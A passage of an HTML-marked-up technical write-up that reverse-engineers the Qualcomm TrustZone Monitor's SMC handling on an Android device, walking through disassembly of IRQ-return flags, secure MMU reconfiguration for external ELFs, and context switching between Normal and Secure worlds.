&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D120&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear tz_irq_interrupted value&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By looking at cross-references, we notice this DWORD is set to 1 in
the IRQ handler of Monitor mode. But in both handlers (SMC &amp;amp; IRQ),
when an exception returns to the Non-Secure world, the returned
value (in R0) is set to 1 if this DWORD is not null.&lt;/p&gt;
&lt;p&gt;Futhermore, we can have a look at how &lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/scm.c"&gt;
SCM&lt;/a&gt; interprets the value returned by a SMC call:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SCM_INTERRUPTED  1&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;asm&lt;/span&gt; &lt;span class="k"&gt;volatile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#ifdef REQUIRES_SEC&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;.arch_extension sec&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="cp"&gt;#endif&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;smc #0 @ switch to secure world&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;=r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;SCM_INTERRUPTED&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;SCM will reiterate each SMC call while the returned value is 1.&lt;/p&gt;
&lt;p&gt;We can deduce that this DWORD indicates if the exception return is
due to an IRQ interrupt. TrustZone Whitepaper (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/CACCDCDH.html"&gt;3.3.3
Secure interrupts&lt;/a&gt;) says ARM recommends the use of IRQ as a
Normal world interrupt source. That's why IRQ interrupts are
handled in the Normal world.&lt;/p&gt;
&lt;h5&gt;IV.3.A.f Configure Secure world MMU&lt;/h5&gt;

&lt;p&gt;Next block of instructions modifies the translation table of Secure
MMU (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; B3.1 About the VMSA) if two conditions are met:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D124&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; read MPIDR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D128&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; extract Aff0 from MPIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D12C&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D130&lt;/span&gt;                 &lt;span class="no"&gt;BNE&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D164&lt;/span&gt; &lt;span class="c1"&gt;; jump if current core != CPU0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D134&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_ext_elf_loaded&lt;/span&gt; &lt;span class="c1"&gt;; read external ELF status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D138&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D13C&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D140&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D164&lt;/span&gt; &lt;span class="c1"&gt;; jump if no external ELF loaded&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D144&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_ext_elf_ttbr0&lt;/span&gt; &lt;span class="c1"&gt;; read TTBR0 ptr for external ELF&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D148&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D14C&lt;/span&gt;                 &lt;span class="no"&gt;DSB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D150&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write new TTBR0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D154&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D158&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; flush TLBs&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D15C&lt;/span&gt;                 &lt;span class="no"&gt;DSB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D160&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, it checks if the current core is CPU0.&lt;/p&gt;
&lt;p&gt;Then, it checks if a DWORD is not null. By looking at
cross-references, we notice that this DWORD is modified in SCM
handler of QSEOS_LOAD_EXTERNAL_ELF_COMMAND call (not part of the
Monitor code). This SCM call is made by qseecom_load_external_elf()
function in the&amp;nbsp;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/drivers/misc/qseecom.c"&gt;QSEECOM
Linux driver&lt;/a&gt;. This function allows the HLOS to load an external
ELF binary into the Secure World. We can remark that this function
first ensures to run on CPU0.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;qseecom_load_external_elf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;qseecom_dev_handle&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;__user&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
 &lt;span class="cm"&gt;/* SCM_CALL tied to Core0 */&lt;/span&gt;
 &lt;span class="n"&gt;mask&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CPU_MASK_CPU0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;set_cpu_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_cpus_allowed_ptr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;current&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can also refer to TrustZone Whitepaper to learn more about
"&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch05s04s01.html"&gt;Secure
World processor affinity&lt;/a&gt;" on multiprocessor systems.&lt;/p&gt;
&lt;p&gt;Finally, if those checks are successful, the Translation Table Base
Register 0 (TTBR0) is modified, and data &amp;amp; instruction TLBs are
both flushed. TTBR0 holds the physical address of the first-level
translation table used by the Secure MMU to perform table
translation walks.&lt;/p&gt;
&lt;p&gt;This block of instructions will configure the MMU to create a
dedicated address space in the Secure World if an external ELF is
loaded on CPU0.&lt;/p&gt;
&lt;h5&gt;IV.3.A.g Context switching&lt;/h5&gt;

&lt;p&gt;Before switching to Secure World, Normal World context is saved
into Secure memory (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch05s03s01.html"&gt;TrustZone
Whitepaper, 5.3.1 Context switching&lt;/a&gt;). It includes :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;General purpose registers (R0-R12)&lt;/li&gt;
&lt;li&gt;Banked registers SPSR, SP and LR of each mode IRQ, SVC, ABT,
UND.&lt;/li&gt;
&lt;li&gt;Banked registers SPSR, R8, R9, R10, R11, R12, SP and LR of FIQ
mode.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D168&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; save Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D16C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Non-Secure context&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D170&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D174&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D178&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D17C&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D180&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D184&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D188&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D18C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D190&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D194&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D198&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D19C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A0&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A4&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1AC&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B0&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B4&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Because the current security state is Secure (SCR.NS == 0), CPS
instructions can be used to switch to each mode before finally
switching back to Monitor mode. MRS instruction reads a Special
Register (like SPSR) and writes it to a general purpose register.&lt;/p&gt;
&lt;p&gt;Later, this saved context will be restored when the processor
switches back to the Normal World.&lt;/p&gt;
&lt;p&gt;Then, Secure World context is restored from a previous context
switch (Secure to Normal World).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B8&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;S_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area where previous Secure context is stored&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1BC&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C0&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C4&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1C8&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1CC&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D0&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D4&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1D8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1DC&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E0&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E4&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1E8&lt;/span&gt;                 &lt;span class="no"&gt;LDMIA&lt;/span&gt;           &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1EC&lt;/span&gt;                 &lt;span class="no"&gt;MSR&lt;/span&gt;             &lt;span class="no"&gt;SPSR_cxsf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R12&lt;/span&gt; &lt;span class="c1"&gt;; write SPSR_und&lt;/span&gt;
